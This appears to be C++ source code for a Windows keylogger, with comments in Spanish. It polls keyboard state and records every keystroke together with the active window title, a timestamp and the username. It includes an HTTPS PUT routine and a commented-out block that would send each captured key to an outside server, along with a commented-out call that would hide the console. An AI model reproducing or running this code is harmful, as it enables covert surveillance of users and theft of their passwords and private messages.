#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include<ctime>
#include<lmcons.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

using namespace std;

//Web Service
std::wstring get_utf16(const std::string& str, int codepage) {
	if (str.empty()) return std::wstring();
	int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
	std::wstring res(sz, 0);
	MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
	return res;
}

string HttpsWebRequestPost(string domain, string url, string dat) {
	//Extra
	LPSTR data = const_cast<char*>(dat.c_str());
	DWORD data_len = strlen(data);

	wstring sdomain = get_utf16(domain, CP_UTF8);
	wstring surl = get_utf16(url, CP_UTF8);
	string response;

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL bResults = FALSE;
	HINTERNET	hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	//Use WinHttpOpen to obtain a session handle
	hSession = WinHttpOpen(L"WinHttp Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	//Specify an HTTP server
	if (hSession)
		hConnect = WinHttpConnect(hSession, sdomain.c_str(),
			INTERNET_DEFAULT_HTTPS_PORT, 0);

	//Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"PUT", surl.c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);

	//Send a request
	if (hRequest)
		bResults = WinHttpSendRequest(
			hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			(LPVOID)data,
			data_len,
			data_len,
			0);


	//End the request
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	//Keep checking the data until there is nothing left.
	if (bResults) {
		do {
			//Check for available data
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				printf("Error $u in WinHttpQueryDataAvailable.\n", GetLastError());

			//Allocate space for the buffer
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer) {
				printf("Out of memory\n");
				dwSize = 0;
			}
			else {
				//Read the data
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					printf("Error %u in WinHttpReadData.\n", GetLastError());
				else
					//printf("%s", pszOutBufffer);
					response = response + string(pszOutBuffer);
				//Free the memory allocated to the buffer
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
	}

	//Report any errors
	if (!bResults)
		printf("Error %d ha ocurrido", GetLastError());

	//Close any open handler
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return response;
}

//Variables globales de entorno de ejecución y sus función Entorno() para asignarlas
string window;
string timestamp;
string name;

void Entorno() {
	const int SizeOfTitleBarText = GetWindowTextLength(GetForegroundWindow());
	char* wnd_title = (char*)malloc(SizeOfTitleBarText + 1);
	GetWindowText(GetForegroundWindow(), wnd_title, SizeOfTitleBarText + 1);
	window = wnd_title;
	free(wnd_title);

	std::time_t time = std::time(nullptr);
	timestamp = std::to_string(time);

	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName((TCHAR*)username, &username_len);
	name = username;
}

typedef struct tecla {
	string tiempo;
	string ventana;
	string key;
	string nombre;
} type_key;

type_key str_key;

bool TeclasPulsadas(int tecla) {
	Entorno();
	str_key.ventana = window;
	str_key.tiempo = timestamp;
	str_key.nombre = "" + name + "_" + timestamp;

	switch (tecla) {
	case VK_SPACE:
		// Process the SPACE key.
		str_key.key = "{ESPACIO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_RETURN:
		// Process the ENTER key.
		cout << "\r\n";
		str_key.key = "{INTRO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_SHIFT:
		// Process the SHIFT key.
		str_key.key = "{SHIFT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_BACK:
		// Process the BACK SPACE key.
		str_key.key = "{RETROCESO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_LEFT:
		// Process the LEFT ARROW key.
		str_key.key = "{LEFT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_RIGHT:
		// Process the RIGHT ARROW key.
		str_key.key = "{RIGHT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_UP:
		// Process the UP ARROW key. 
		str_key.key = "{UP}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_DOWN:
		// Process the DOWN ARROW key. 
		str_key.key = "{DOWN}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_HOME:
		// Process the HOME key. 
		str_key.key = "{HOME}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_END:
		// Process the END key. 
		str_key.key = "{END}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_INSERT:
		// Process the INS key.
		str_key.key = "{INSERT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_DELETE:
		// Process the DEL key. 
		str_key.key = "{DELETE}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F1:
		// Process the F1 key.
		str_key.key = "{F1}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F2:
		// Process the F2 key.
		str_key.key = "{F2}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F3:
		// Process the F3 key.
		str_key.key = "{F3}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F4:
		// Process the F4 key.
		str_key.key = "{F4}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F5:
		// Process the F5 key.
		str_key.key = "{F5}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F6:
		// Process the F6 key.
		str_key.key = "{F6}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F7:
		// Process the F7 key.
		str_key.key = "{F7}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F8:
		// Process the F8 key.
		str_key.key = "{F8}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F9:
		// Process the F9 key.
		str_key.key = "{F9}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F10:
		// Process the F10 key.
		str_key.key = "{F10}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F11:
		// Process the F11 key.
		str_key.key = "{F11}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F12:
		// Process the F12 key.
		str_key.key = "{F12}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	default: return false;
	}
}

//Implementación de la cola
typedef struct t_node {
	type_key* key;
	t_node* next;
}Node;

typedef struct t_queue {
	int size;
	Node* front;
	Node* tail;
}Queue;

Node* getNode(type_key* key) {
	Node* node = (Node*)malloc(sizeof(Node));
	node->key = key;
	node->next = NULL;
	return node;
}

Queue* getNewQueue() {
	Queue* q = (Queue*)malloc(sizeof(Queue));
	q->size = 0;
	q->front = NULL;
	q->tail = NULL;
	return q;
}

void Enqueue(Queue* q, Node* node) {
	if (q->front == NULL)	q->front = node;
	else q->tail->next = node;
	q->tail = node;
	q->size++;
}

type_key* Dequeue(Queue* q) {
	if (q->size) {
		type_key* returnValue;
		Node* aux = q->front;
		returnValue = aux->key;
		q->front = q->front->next;
		free(aux);
		q->size--;
		return returnValue;
	}
	return NULL;
}

//--Implementación de la cola--

int main() {
	//FreeConsole();
	unsigned char key;
	Queue* QUEUE = getNewQueue();
	type_key* send_key = (type_key*)malloc(sizeof(type_key));

	//Desplegar Encabezados
	cout << "Tecla\t\t\t";
	cout << "Ventana\t\t\t";
	cout << "Timestamp\t\t\t";
	cout << "Nombre\n";
	cout << "----------------------------------------------------------------------------\n";
	
	while (TRUE) {
		Sleep(10);

		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {

				if (TeclasPulsadas(key) == FALSE) {
					//string temp_char_to_string(1, key);
					str_key.key = key;
					
					Node* a = getNode(&str_key);
					Enqueue(QUEUE, a);

					//Envío al web service
					/*
					string body = "{"
						"\"Time\":\""+str_key.tiempo+"\","
						"\"Window\":\""+str_key.ventana+"\","
						"\"Key\":\""+str_key.key+"\""
						"}";
					string ruta = "/evento/" + str_key.nombre;
					HttpsWebRequestPost("eye.horus.click", ruta, body);

					*/
					//Impresión de depuración
					cout << str_key.key+"\t";
					cout << str_key.ventana+"\t";
					cout << str_key.tiempo+"\t";
					cout << str_key.nombre+"\n";
					
				}
			}
		}
	}
	free(QUEUE);
	free(send_key);
}